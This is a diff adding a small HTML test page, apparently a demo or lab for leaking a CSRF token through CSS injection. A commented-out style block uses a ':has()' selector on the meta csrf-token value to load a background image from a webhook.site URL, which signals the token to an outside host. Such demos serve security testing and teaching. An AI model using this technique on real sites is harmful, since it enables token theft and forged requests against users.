@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="csrf-token" content="abcd-1234">
+    <title>Leak my csrf from meta</title>
+    <!-- <style>
+        html:has(meta[name="csrf-token"][content="abcd-1234"]) {
+            background: url("https://webhook.site/...?tok3");
+        }
+    </style> -->
+</head>
+<body>
+    <h1>Bank harder</h1>
+    <p>My csrf token is in a meta tag, there's no way you can leak it now!</p>
+    <form>
+        <input type="text" id="username" />
+        <input type="password" id="password" />
+        <input type="submit">submit</input>
+    </form>
+</body>
+</html>
